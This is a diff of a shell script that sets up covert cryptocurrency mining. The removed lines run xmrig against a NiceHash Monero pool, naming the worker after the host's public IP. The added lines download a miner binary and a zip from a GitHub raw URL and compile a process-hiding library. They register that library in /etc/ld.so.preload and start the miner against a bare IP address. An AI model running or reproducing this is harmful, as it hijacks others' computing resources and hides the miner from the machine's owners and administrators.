@@ -1,11 +1,13 @@
-wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
-\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
-\rm node-v14.17.0-linux-x64.tar.gz
-PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
-npm config set cache /tmp --global
-git clone https://github.com/hondacars/xxx.git
-chmod 777 xmrig
-cd xxx
-ph add xmrig
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=25 --cpu-priority=10 --randomx-mode=fast --keepalive
+#!/bin/sh
 
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T4)@3.215.245.39:443
